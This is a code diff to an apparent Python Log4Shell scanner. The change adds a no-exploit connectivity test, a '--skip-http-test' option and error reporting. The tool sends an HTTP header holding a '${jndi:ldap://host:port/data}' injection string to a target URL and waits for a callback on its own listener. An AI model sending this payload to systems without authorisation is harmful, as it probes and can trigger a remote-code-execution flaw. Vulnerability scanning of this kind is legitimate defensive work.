@@ -506,7 +506,7 @@ YYYY-MM-DD HH:MM:SS 255.255.255.255:32767 --> 255.255.255.255:32767
 def usage():
 
   print("\n%s v%s Rev%s\n%s\n" % (PROGRAM, VERSION, REVISION, AUTHOR))
-  print("Usage: %s [-erTWx] [-i|p|h|t <arg>] <url>" % (
+  print("Usage: %s [-erTWx] [--skip-http-test] [-i|p|h|t <arg>] <url>" % (
         PROGRAM))
 
   print("""
@@ -524,6 +524,7 @@ OPTIONS:
   -T | --skip-callback-test         skip reachability test [NOT RECOMMENDED!]
   -x | --use-system-proxy           send exploit request via Proxy
   -W | --disable-warnings           disable warnings [NOT RECOMMENDED!]
+       --skip-http-test             skip http test [NOT RECOMMENDED!]
 
 """)  
 
@@ -673,7 +674,8 @@ def sendExploitedRequest(
         exploitCBPort       = 1389,
         exploitCBUserData   = None,
         useProxy            = False,
-        requestTimeout      = 8.0):
+        requestTimeout      = 8.0,
+        noExploit           = False):
 
   try:
     urllib3.disable_warnings()
@@ -684,14 +686,21 @@ def sendExploitedRequest(
 
   # ${jndi:ldap://${LDAP_HOST}:${LDAP_PORT}/${LDAP_USERDATA}}
 
-  ret       = { "succeeded": False, "status": -1 }
+  ret               = {
+    "succeeded"     : False,
+    "status"        : -1,
+    "error"         : "",
+    }
   
-  headers   = {
-    exploitHeaderName: ("${jndi:ldap://%s:%d/%s}" % (
-            exploitCBIP,
-            exploitCBPort,
-            exploitCBUserData))
-  }
+  if(not(noExploit)):
+    headers     = {
+                exploitHeaderName: ("${jndi:ldap://%s:%d/%s}" % (
+                    exploitCBIP,
+                    exploitCBPort,
+                    exploitCBUserData))
+                }
+  else:
+    headers    = {}
   
   if("://" in url):
     (p, u) = url.split("://")
@@ -713,8 +722,9 @@ def sendExploitedRequest(
       ret["succeeded"]  = True
       ret["status"]     = response.status_code
       break
-    except:
+    except Exception as e:
       ret["succeeded"]  = False
+      ret["error"]      = str(e)
       if(WANT_EXCEPTIONS): raise
             
   return(ret)
@@ -764,6 +774,7 @@ def main():
   exploitCBTimeout  = TIMEOUT_EXPLOIT_CB
   useProxy          = False
   disableWarnings   = False
+  skipHTTPTest      = False
 
   ## Option Processing      BEGIN   ------------------------------------------
   for sig in [signal.SIGINT, signal.SIGTERM]:
@@ -785,6 +796,7 @@ def main():
             "skip-callback-test",
             "use-system-proxy",
             "disable-warnings",
+            "skip-http-test",
             ])
   except getopt.GetoptError as err:
     _ = err       # Reserved for Future Use!
@@ -824,6 +836,8 @@ def main():
       useProxy              = True
     elif(o in ("-W", "--disable-warnings")):
       disableWarnings       = True
+    elif(o in ("--skip-http-test")):
+      skipHTTPTest          = True
     else:
       usage()
 
@@ -834,6 +848,32 @@ def main():
 
   ## Option Processing      END     ------------------------------------------
   ## Test Setup             BEGIN   ------------------------------------------
+
+  if(not(useProxy)):
+    proxyEnabled = isSystemProxyEnabled()
+    if(proxyEnabled is None):
+      pass
+
+  if(not(skipHTTPTest)):
+    printStatus(
+            "Sending HTTP Request WITHOUT EXPLOIT for Connectivity Test",
+            url                 = url)
+  
+    reqStatus = sendExploitedRequest(
+            url,
+            useProxy            = useProxy,
+            noExploit           = True)
+
+    printStatus(
+            "Exploit HTTP Request Sent",
+            url                 = url,
+            succeeded           = str(reqStatus["succeeded"]),
+            http_status         = str(reqStatus["status"]),
+            error               = reqStatus["error"])
+  
+    if((not(reqStatus.get("succeeded", False))) or
+            (reqStatus.get("status", -1) < 0)):
+      errorexit("Failed to Send Test HTTP Request (RESULTS WILL BE INVALID); Exiting!")
 
   if(exploitCBUserData is None):
     exploitCBUserData = ("".join(random.choice(string.ascii_lowercase)
@@ -858,11 +898,7 @@ def main():
       errorexit("Failed to start TCP Thread: %s; Exiting..." %
             (str(e)))
   
-  if(not(useProxy)):
-    proxyEnabled = isSystemProxyEnabled()
-    if(proxyEnabled is None):
-      pass
-
+ 
   ## Test Setup             END     ------------------------------------------
   ## Test Validation        BEGIN   ------------------------------------------
 
@@ -901,7 +937,8 @@ def main():
         "Exploit HTTP Request Sent",
         url                 = url,
         succeeded           = str(reqStatus["succeeded"]),
-        http_status         = str(reqStatus["status"]))
+        http_status         = str(reqStatus["status"]),
+        error               = reqStatus["error"])
   
   if((reqStatus.get("succeeded", False)) or
         (reqStatus.get("status", -1) > -1)):
